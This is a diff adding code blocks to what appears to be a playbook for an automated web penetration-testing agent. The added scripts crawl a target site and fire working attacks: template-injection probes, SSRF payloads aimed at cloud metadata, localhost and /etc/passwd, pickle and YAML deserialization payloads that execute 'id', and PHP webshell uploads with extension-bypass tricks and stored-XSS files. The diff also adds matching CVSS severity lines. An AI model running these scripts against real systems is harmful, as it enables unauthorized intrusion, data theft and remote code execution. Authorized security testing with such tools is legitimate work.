@@ -2730,6 +2730,518 @@ if not _pp_found:
       print('  Checked: ' + ', '.join(sorted(cmdi_candidates))[:200])
   ```
 
+  **SSTI (Server-Side Template Injection) — Test ALL Text Inputs:**
+  ```python
+  import time, re
+  from urllib.parse import urljoin
+
+  BASE    = _G['BASE']
+  session = _G.get('session_a') or _G.get('session')
+  AUTH_FORMS = _G.get('AUTH_FORMS', [])
+  ALL_FORMS  = _G.get('ALL_FORMS', [])
+  all_forms  = AUTH_FORMS + ALL_FORMS
+
+  # Probes that produce a known result if template engine evaluates them
+  SSTI_PROBES = [
+      {'payload': '{{7*7}}',           'expect': '49',          'engine': 'Jinja2/Twig'},
+      {'payload': '${7*7}',            'expect': '49',          'engine': 'FreeMarker/Mako'},
+      {'payload': '#{7*7}',            'expect': '49',          'engine': 'Ruby ERB/Java EL'},
+      {'payload': '<%= 7*7 %>',        'expect': '49',          'engine': 'ERB/EJS'},
+      {'payload': '{{constructor.constructor("return 7*7")()}}', 'expect': '49', 'engine': 'Angular/Pug'},
+      {'payload': '${T(java.lang.Runtime).getRuntime()}', 'expect': 'java.lang.Runtime', 'engine': 'Spring EL'},
+  ]
+
+  # Also test URL params from crawl
+  AUTH_PARAMS = _G.get('AUTH_PARAMS', [])
+
+  ssti_findings = []
+  print(f"[SSTI] Testing {len(all_forms)} forms + {len(AUTH_PARAMS)} URL params")
+
+  # Test forms
+  for form in all_forms:
+      action = form.get('action', BASE)
+      method = form.get('method', 'get').lower()
+      fields = form.get('fields', [])
+      url = action if action.startswith('http') else urljoin(BASE, action)
+      text_fields = [f for f in fields if f.get('type', 'text') not in ('submit','hidden','checkbox','radio','file','button')]
+      if not text_fields:
+          continue
+      for field in text_fields:
+          fname = field['name']
+          for probe in SSTI_PROBES:
+              time.sleep(0.3)
+              data = {f['name']: f.get('value', 'test') or 'test' for f in fields}
+              data[fname] = probe['payload']
+              try:
+                  if method == 'post':
+                      r = session.post(url, data=data, timeout=10, allow_redirects=True)
+                  else:
+                      r = session.get(url, params=data, timeout=10, allow_redirects=True)
+              except Exception:
+                  continue
+              # Check if the math was evaluated (49 appears but the payload template syntax doesn't)
+              if probe['expect'] in r.text and probe['payload'] not in r.text:
+                  print(f"[CRITICAL] SSTI CONFIRMED: {url} param={fname}")
+                  print(f"  Engine: {probe['engine']}  Payload: {probe['payload']}")
+                  print(f"  Response contains '{probe['expect']}' (evaluated)")
+                  idx = r.text.find(probe['expect'])
+                  print(f"  Context: ...{r.text[max(0,idx-60):idx+60]}...")
+                  ssti_findings.append({'url': url, 'param': fname, 'engine': probe['engine'],
+                                        'payload': probe['payload'], 'method': method.upper()})
+                  break  # confirmed on this field, move to next
+
+  # Test URL params
+  for param_info in AUTH_PARAMS:
+      purl = param_info['url'].split('?')[0]
+      pname = param_info['param']
+      for probe in SSTI_PROBES:
+          time.sleep(0.3)
+          try:
+              r = session.get(purl, params={pname: probe['payload']}, timeout=10)
+          except Exception:
+              continue
+          if probe['expect'] in r.text and probe['payload'] not in r.text:
+              print(f"[CRITICAL] SSTI CONFIRMED: {purl} param={pname}")
+              print(f"  Engine: {probe['engine']}  Payload: {probe['payload']}")
+              ssti_findings.append({'url': purl, 'param': pname, 'engine': probe['engine'],
+                                    'payload': probe['payload'], 'method': 'GET'})
+              break
+
+  if ssti_findings:
+      _G.setdefault('FINDINGS', [])
+      for sf in ssti_findings:
+          _G['FINDINGS'].append({'severity': 'CRITICAL', 'title': f"SSTI ({sf['engine']}) — {sf['param']}", 'url': sf['url'], 'detail': sf})
+      print(f"\n[CRITICAL] SSTI found on {len(ssti_findings)} parameter(s)!")
+  else:
+      print("[INFO] No SSTI detected")
+  ```
+
+  **SSRF (Server-Side Request Forgery) — Auto-Discover & Test URL-Fetching Endpoints:**
+  ```python
+  import time, re
+  from urllib.parse import urljoin, urlparse, parse_qs
+
+  BASE    = _G['BASE']
+  session = _G.get('session_a') or _G.get('session')
+  AUTH_FORMS = _G.get('AUTH_FORMS', [])
+  ALL_FORMS  = _G.get('ALL_FORMS', [])
+  AUTH_PAGES = _G.get('AUTH_PAGES', {})
+  ALL_PAGES  = _G.get('ALL_PAGES', {})
+
+  # Keywords indicating a URL-fetching feature
+  SSRF_KEYWORDS = ['url', 'uri', 'fetch', 'load', 'src', 'source', 'link', 'href',
+                   'path', 'file', 'page', 'site', 'redirect', 'proxy', 'callback',
+                   'webhook', 'endpoint', 'resource', 'image', 'img', 'avatar',
+                   'preview', 'pdf', 'import', 'feed', 'rss']
+
+  SSRF_PATHS = ['/fetch', '/proxy', '/redirect', '/load', '/preview', '/pdf',
+                '/api/fetch', '/api/proxy', '/webhook', '/import', '/ssrf',
+                '/url', '/curl', '/request', '/get', '/image', '/avatar']
+
+  # SSRF test payloads — each targets a different internal resource
+  SSRF_PAYLOADS = [
+      {'payload': 'http://127.0.0.1:80',      'check': lambda t: len(t) > 100, 'label': 'localhost HTTP'},
+      {'payload': 'http://localhost:11434/api/tags', 'check': lambda t: 'models' in t, 'label': 'Ollama internal'},
+      {'payload': 'http://169.254.169.254/latest/meta-data/', 'check': lambda t: 'ami-id' in t or 'instance' in t, 'label': 'AWS metadata'},
+      {'payload': 'http://169.254.169.254/computeMetadata/v1/', 'check': lambda t: 'project' in t, 'label': 'GCP metadata'},
+      {'payload': 'file:///etc/passwd', 'check': lambda t: 'root:' in t, 'label': 'local file read'},
+      {'payload': 'file:///etc/hostname', 'check': lambda t: len(t.strip()) > 0 and len(t.strip()) < 100, 'label': 'hostname file'},
+  ]
+
+  ssrf_candidates = set()
+
+  # 1. Find URL-accepting params from forms
+  for form in AUTH_FORMS + ALL_FORMS:
+      for field in form.get('fields', []):
+          fname = field.get('name', '').lower()
+          if any(kw in fname for kw in SSRF_KEYWORDS):
+              action = form.get('action', BASE)
+              url = action if action.startswith('http') else urljoin(BASE, action)
+              ssrf_candidates.add((url, fname, form.get('method', 'get').lower(), 'form'))
+
+  # 2. Find URL-accepting params from crawled links
+  for page_url in list(AUTH_PAGES.keys()) + list(ALL_PAGES.keys()):
+      parsed = urlparse(page_url)
+      for param, vals in parse_qs(parsed.query).items():
+          if any(kw in param.lower() for kw in SSRF_KEYWORDS):
+              ssrf_candidates.add((page_url.split('?')[0], param, 'get', 'url_param'))
+
+  # 3. Probe common SSRF paths
+  for path in SSRF_PATHS:
+      endpoint = BASE.rstrip('/') + path
+      try:
+          r = session.get(endpoint, timeout=6)
+          if r.status_code not in (404, 410):
+              # Look for form inputs on this page
+              from bs4 import BeautifulSoup
+              soup = BeautifulSoup(r.text, 'html.parser')
+              for form in soup.find_all('form'):
+                  for inp in form.find_all(['input', 'textarea']):
+                      n = inp.get('name', '')
+                      if n and any(kw in n.lower() for kw in SSRF_KEYWORDS):
+                          action = form.get('action', '')
+                          furl = action if action.startswith('http') else urljoin(endpoint, action or path)
+                          method = form.get('method', 'get').lower()
+                          ssrf_candidates.add((furl, n, method, 'probed'))
+              # If no form but page is alive, try GET params
+              if not soup.find_all('form'):
+                  for p in ['url', 'fetch', 'uri', 'src', 'file', 'path']:
+                      ssrf_candidates.add((endpoint, p, 'get', 'guess'))
+      except Exception:
+          pass
+
+  ssrf_findings = []
+  print(f"[SSRF] Testing {len(ssrf_candidates)} candidate params")
+
+  for (url, param, method, source) in sorted(ssrf_candidates):
+      print(f"  Testing: {method.upper()} {url} param={param} (from {source})")
+      for ssrf in SSRF_PAYLOADS:
+          time.sleep(0.3)
+          try:
+              if method == 'post':
+                  r = session.post(url, data={param: ssrf['payload']}, timeout=10, verify=False)
+              else:
+                  r = session.get(url, params={param: ssrf['payload']}, timeout=10, verify=False)
+          except Exception:
+              continue
+          if ssrf['check'](r.text):
+              print(f"[CRITICAL] SSRF CONFIRMED: {url} param={param}")
+              print(f"  Payload: {ssrf['payload']}  ({ssrf['label']})")
+              print(f"  Response: {r.text[:300]}")
+              ssrf_findings.append({'url': url, 'param': param, 'payload': ssrf['payload'],
+                                    'label': ssrf['label'], 'method': method.upper(),
+                                    'evidence': r.text[:500]})
+              break
+
+  if ssrf_findings:
+      _G.setdefault('FINDINGS', [])
+      for sf in ssrf_findings:
+          _G['FINDINGS'].append({'severity': 'CRITICAL', 'title': f"SSRF — {sf['label']}", 'url': sf['url'], 'detail': sf})
+      print(f"\n[CRITICAL] SSRF found on {len(ssrf_findings)} endpoint(s)!")
+  else:
+      print("[INFO] No SSRF detected")
+  ```
+
+  **Insecure Deserialization — Auto-Discover & Test Pickle/YAML/JSON Endpoints:**
+  ```python
+  import time, re, base64, pickle
+  from urllib.parse import urljoin
+
+  BASE    = _G['BASE']
+  session = _G.get('session_a') or _G.get('session')
+  AUTH_PAGES = _G.get('AUTH_PAGES', {})
+  ALL_PAGES  = _G.get('ALL_PAGES', {})
+
+  # Paths commonly used for deserialization endpoints
+  DESER_PATHS = ['/deserialize', '/api/deserialize', '/import', '/import-data',
+                 '/load', '/api/load', '/upload', '/api/upload',
+                 '/pickle', '/unpickle', '/api/import', '/data',
+                 '/transfer', '/restore', '/api/restore', '/yaml',
+                 '/api/yaml', '/config/import', '/api/config']
+
+  # Params that accept serialized data
+  DESER_PARAMS = ['data', 'payload', 'input', 'obj', 'object', 'pickle',
+                  'serialized', 'import', 'content', 'body', 'config', 'yaml']
+
+  # Safe detection payloads (no RCE — just detect if deserialization happens)
+  # Pickle: serialize a simple object and check if server processes it without error
+  class _SafeProbe:
+      def __init__(self):
+          self.marker = 'DESER_PROBE_OK'
+  _safe_pickle = base64.b64encode(pickle.dumps(_SafeProbe())).decode()
+  _safe_pickle_list = base64.b64encode(pickle.dumps([1, 2, 3])).decode()
+
+  # Dangerous pickle (for CONFIRMED endpoints only — executes `id`)
+  class _RCEProbe:
+      def __reduce__(self):
+          import os
+          return (os.popen, ('id',))
+  _rce_pickle = base64.b64encode(pickle.dumps(_RCEProbe())).decode()
+
+  # YAML unsafe load payloads
+  YAML_PAYLOADS = [
+      '!!python/object/apply:os.popen ["id"]',
+      '!!python/object/new:subprocess.check_output [["id"]]',
+  ]
+
+  deser_candidates = set()
+
+  # 1. Probe known paths
+  for path in DESER_PATHS:
+      endpoint = BASE.rstrip('/') + path
+      try:
+          r = session.get(endpoint, timeout=6, allow_redirects=True)
+          if r.status_code not in (404, 410):
+              if 'login' in r.url and 'login' not in endpoint:
+                  continue
+              deser_candidates.add(endpoint)
+              print(f"  [DESER] Live endpoint: {endpoint} ({r.status_code})")
+      except Exception:
+          pass
+
+  # 2. Check crawled pages for deserialization-related forms/content
+  for page_url, body in {**ALL_PAGES, **AUTH_PAGES}.items():
+      body_lower = body.lower()
+      if any(kw in body_lower for kw in ['pickle', 'deserializ', 'unpickle', 'yaml.load',
+                                          'base64', 'serialized', 'marshal', 'readobject']):
+          deser_candidates.add(page_url)
+
+  deser_findings = []
+  print(f"[DESER] Testing {len(deser_candidates)} candidate endpoints")
+
+  for endpoint in sorted(deser_candidates):
+      # Try POST with pickle payloads in various param names
+      for param in DESER_PARAMS:
+          time.sleep(0.3)
+
+          # Test 1: Safe pickle — does server accept and process it?
+          for payload_b64 in [_safe_pickle, _safe_pickle_list]:
+              try:
+                  r = session.post(endpoint, data={param: payload_b64}, timeout=10, verify=False)
+              except Exception:
+                  continue
+              body_lower = r.text.lower()
+
+              # Signs of pickle processing
+              if r.status_code == 200 and 'error' not in body_lower[:200]:
+                  print(f"  [WARN] {endpoint} param={param} accepted pickle data (HTTP 200, no error)")
+
+                  # Confirmed — now test RCE payload
+                  time.sleep(0.3)
+                  try:
+                      r2 = session.post(endpoint, data={param: _rce_pickle}, timeout=10, verify=False)
+                  except Exception:
+                      continue
+                  if re.search(r'uid=\d+\([a-z_]+\)', r2.text):
+                      print(f"[CRITICAL] Pickle RCE CONFIRMED: {endpoint} param={param}")
+                      print(f"  Evidence: {re.search(r'uid=.{{0,30}}', r2.text).group()}")
+                      deser_findings.append({'url': endpoint, 'param': param, 'type': 'pickle_rce',
+                                             'evidence': r2.text[:300]})
+                      break
+              elif 'unpickl' in body_lower or 'deserializ' in body_lower or 'pickle' in body_lower:
+                  print(f"  [INFO] {endpoint} mentions pickle/deserialization in error — endpoint processes serialized data")
+
+          # Test 2: YAML unsafe load
+          for yaml_payload in YAML_PAYLOADS:
+              time.sleep(0.3)
+              for content_type in ['application/x-yaml', 'text/yaml', 'application/x-www-form-urlencoded']:
+                  try:
+                      if content_type == 'application/x-www-form-urlencoded':
+                          r = session.post(endpoint, data={'data': yaml_payload, 'config': yaml_payload}, timeout=10, verify=False)
+                      else:
+                          r = session.post(endpoint, data=yaml_payload, headers={'Content-Type': content_type}, timeout=10, verify=False)
+                  except Exception:
+                      continue
+                  if re.search(r'uid=\d+\([a-z_]+\)', r.text):
+                      print(f"[CRITICAL] YAML deserialization RCE: {endpoint}")
+                      print(f"  Payload: {yaml_payload}")
+                      deser_findings.append({'url': endpoint, 'type': 'yaml_rce',
+                                             'payload': yaml_payload, 'evidence': r.text[:300]})
+                      break
+
+  # Test 3: Raw body POST (some endpoints accept raw pickle in body)
+  for endpoint in sorted(deser_candidates):
+      time.sleep(0.3)
+      try:
+          r = session.post(endpoint, data=base64.b64decode(_rce_pickle),
+                           headers={'Content-Type': 'application/octet-stream'}, timeout=10, verify=False)
+          if re.search(r'uid=\d+\([a-z_]+\)', r.text):
+              print(f"[CRITICAL] Raw pickle RCE: {endpoint}")
+              deser_findings.append({'url': endpoint, 'type': 'raw_pickle_rce', 'evidence': r.text[:300]})
+      except Exception:
+          pass
+
+  if deser_findings:
+      _G.setdefault('FINDINGS', [])
+      for df in deser_findings:
+          _G['FINDINGS'].append({'severity': 'CRITICAL', 'title': f"Insecure Deserialization ({df['type']})", 'url': df['url'], 'detail': df})
+      print(f"\n[CRITICAL] Deserialization RCE on {len(deser_findings)} endpoint(s)!")
+  else:
+      print("[INFO] No insecure deserialization detected")
+  ```
+
+  **File Upload — Test for Web Shell Upload & Bypass:**
+  ```python
+  import time, re, os
+  from urllib.parse import urljoin
+  from bs4 import BeautifulSoup
+
+  BASE    = _G['BASE']
+  session = _G.get('session_a') or _G.get('session')
+  AUTH_FORMS = _G.get('AUTH_FORMS', [])
+  ALL_FORMS  = _G.get('ALL_FORMS', [])
+  AUTH_PAGES = _G.get('AUTH_PAGES', {})
+  ALL_PAGES  = _G.get('ALL_PAGES', {})
+
+  # Find forms with file upload inputs
+  upload_forms = []
+  for form in AUTH_FORMS + ALL_FORMS:
+      has_file = any(f.get('type') == 'file' for f in form.get('fields', []))
+      if has_file:
+          upload_forms.append(form)
+
+  # Also probe common upload endpoints
+  UPLOAD_PATHS = ['/upload', '/api/upload', '/file/upload', '/files/upload',
+                  '/import', '/api/import', '/avatar', '/profile/avatar',
+                  '/admin/upload', '/media/upload', '/image/upload']
+
+  for path in UPLOAD_PATHS:
+      endpoint = BASE.rstrip('/') + path
+      if any(f.get('action', '') == endpoint for f in upload_forms):
+          continue
+      try:
+          r = session.get(endpoint, timeout=6)
+          if r.status_code not in (404, 410):
+              if 'login' in r.url and 'login' not in endpoint:
+                  continue
+              soup = BeautifulSoup(r.text, 'html.parser')
+              for form in soup.find_all('form'):
+                  if form.find('input', {'type': 'file'}):
+                      action = form.get('action', '')
+                      furl = action if action.startswith('http') else urljoin(endpoint, action or path)
+                      fields = []
+                      file_field = None
+                      for inp in form.find_all(['input', 'textarea', 'select']):
+                          n = inp.get('name', '')
+                          if not n:
+                              continue
+                          t = inp.get('type', 'text').lower()
+                          if t == 'file':
+                              file_field = n
+                          else:
+                              fields.append({'name': n, 'type': t, 'value': inp.get('value', '')})
+                      if file_field:
+                          upload_forms.append({
+                              'action': furl, 'method': 'post', 'page': endpoint,
+                              'fields': fields, 'file_field': file_field
+                          })
+      except Exception:
+          pass
+
+  # Dedup
+  seen_actions = set()
+  unique_forms = []
+  for f in upload_forms:
+      key = f.get('action', '')
+      if key not in seen_actions:
+          seen_actions.add(key)
+          unique_forms.append(f)
+  upload_forms = unique_forms
+
+  print(f"[UPLOAD] Found {len(upload_forms)} file upload forms")
+
+  # Test payloads — from safe probe to dangerous
+  UPLOAD_TESTS = [
+      # Test 1: Basic PHP webshell
+      {'filename': 'shell.php', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>', 'content_type': 'application/x-php',
+       'check': 'UPLOAD_TEST_', 'label': 'PHP webshell'},
+      # Test 2: Double extension bypass
+      {'filename': 'shell.php.jpg', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>', 'content_type': 'image/jpeg',
+       'check': 'UPLOAD_TEST_', 'label': 'double extension bypass'},
+      # Test 3: Null byte bypass (legacy)
+      {'filename': 'shell.php%00.jpg', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>', 'content_type': 'image/jpeg',
+       'check': 'UPLOAD_TEST_', 'label': 'null byte bypass'},
+      # Test 4: .phtml / .phar alternatives
+      {'filename': 'shell.phtml', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>', 'content_type': 'text/html',
+       'check': 'UPLOAD_TEST_', 'label': 'phtml extension'},
+      # Test 5: Python (for Flask/Django apps)
+      {'filename': 'test.py', 'content': 'import os; print("UPLOAD_TEST_" + os.popen("id").read())', 'content_type': 'text/x-python',
+       'check': 'UPLOAD_TEST_', 'label': 'Python upload'},
+      # Test 6: SVG with XSS
+      {'filename': 'xss.svg', 'content': '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("UPLOAD_XSS")</script></svg>',
+       'content_type': 'image/svg+xml', 'check': 'alert("UPLOAD_XSS")', 'label': 'SVG XSS'},
+      # Test 7: HTML upload (stored XSS)
+      {'filename': 'test.html', 'content': '<html><body><script>alert("UPLOAD_XSS")</script></body></html>',
+       'content_type': 'text/html', 'check': 'alert("UPLOAD_XSS")', 'label': 'HTML stored XSS'},
+  ]
+
+  upload_findings = []
+
+  for form in upload_forms:
+      action = form.get('action', BASE)
+      # Find the file input field name
+      file_field = form.get('file_field')
+      if not file_field:
+          for f in form.get('fields', []):
+              if f.get('type') == 'file':
+                  file_field = f['name']
+                  break
+      if not file_field:
+          file_field = 'file'  # common default
+
+      print(f"\n  Testing upload: POST {action} (file field: {file_field})")
+
+      for test in UPLOAD_TESTS:
+          time.sleep(0.5)
+          # Build multipart form data
+          extra_data = {}
+          for f in form.get('fields', []):
+              if f.get('type') not in ('file', 'submit', 'button'):
+                  extra_data[f['name']] = f.get('value', '') or 'test'
+
+          files = {file_field: (test['filename'], test['content'].encode(), test['content_type'])}
+          try:
+              r = session.post(action, data=extra_data, files=files, timeout=15, verify=False, allow_redirects=True)
+          except Exception as e:
+              print(f"    [ERROR] {test['label']}: {e}")
+              continue
+
+          print(f"    {test['label']}: HTTP {r.status_code} ({len(r.text)} bytes)")
+
+          # Check if response tells us where the file was saved
+          upload_url = None
+          body = r.text
+          # Look for the uploaded filename or a URL in the response
+          fname_base = test['filename'].split('.')[0]
+          for pattern in [
+              r'(?:href|src|url|path|location)["\s:=]+["\']?([^\s"\'<>]+' + re.escape(test['filename']) + r')',
+              r'(?:href|src|url|path|location)["\s:=]+["\']?(/[^\s"\'<>]*/' + re.escape(fname_base) + r'[^\s"\'<>]*)',
+              r'"url"\s*:\s*"([^"]+)"',
+              r'"path"\s*:\s*"([^"]+)"',
+              r'"file"\s*:\s*"([^"]+)"',
+          ]:
+              m = re.search(pattern, body, re.I)
+              if m:
+                  upload_url = urljoin(action, m.group(1))
+                  break
+
+          # Common upload directories to check
+          if not upload_url:
+              for upload_dir in ['/uploads/', '/files/', '/media/', '/static/uploads/', '/images/']:
+                  guess_url = BASE.rstrip('/') + upload_dir + test['filename']
+                  try:
+                      r_check = session.get(guess_url, timeout=6)
+                      if r_check.status_code == 200 and len(r_check.text) > 10:
+                          upload_url = guess_url
+                          break
+                  except Exception:
+                      pass
+
+          if upload_url:
+              print(f"    File accessible at: {upload_url}")
+              try:
+                  r_exec = session.get(upload_url, timeout=10)
+                  if test['check'] in r_exec.text:
+                      severity = 'CRITICAL' if 'webshell' in test['label'] or 'bypass' in test['label'] else 'HIGH'
+                      print(f"[{severity}] File upload vulnerability: {test['label']}")
+                      print(f"  Uploaded: {test['filename']} → {upload_url}")
+                      print(f"  Content executed/rendered! Evidence: {r_exec.text[:200]}")
+                      upload_findings.append({'url': action, 'upload_url': upload_url,
+                                              'filename': test['filename'], 'label': test['label'],
+                                              'severity': severity, 'evidence': r_exec.text[:300]})
+                      break  # confirmed on this form
+              except Exception:
+                  pass
+
+  if upload_findings:
+      _G.setdefault('FINDINGS', [])
+      for uf in upload_findings:
+          _G['FINDINGS'].append({'severity': uf['severity'], 'title': f"File Upload — {uf['label']}", 'url': uf['url'], 'detail': uf})
+      print(f"\n[CRITICAL] File upload vulnerabilities on {len(upload_findings)} form(s)!")
+  else:
+      print("[INFO] No exploitable file upload found")
+  ```
+
 **Phase 10 — GraphQL Testing**
 
 Run this phase ONLY if a GraphQL endpoint was found during recon (Phase 1 probed /graphql,
@@ -3500,6 +4012,8 @@ CVSS v3.1 QUICK REFERENCE (use these scores — do not invent your own):
   SQLi (auth bypass)           → 9.8  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
   Command Injection            → 9.8  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
   Insecure Deserialization/RCE → 9.8  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+  SSTI (template injection)    → 9.8  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+  File Upload (webshell/RCE)   → 9.8  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
   Default credentials          → 9.8  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
   Stored XSS (admin takeover)  → 9.0  CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
 
@@ -3507,6 +4021,7 @@ CVSS v3.1 QUICK REFERENCE (use these scores — do not invent your own):
   Vertical IDOR (priv esc)     → 8.8  CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
   Missing CSRF token           → 8.8  CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
   SSRF (internal network)      → 8.6  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+  File Upload (SVG/HTML XSS)   → 7.5  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
   Write IDOR                   → 8.1  CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
   Weak session secret          → 8.1  CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
   API IDOR (no auth)           → 7.5  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
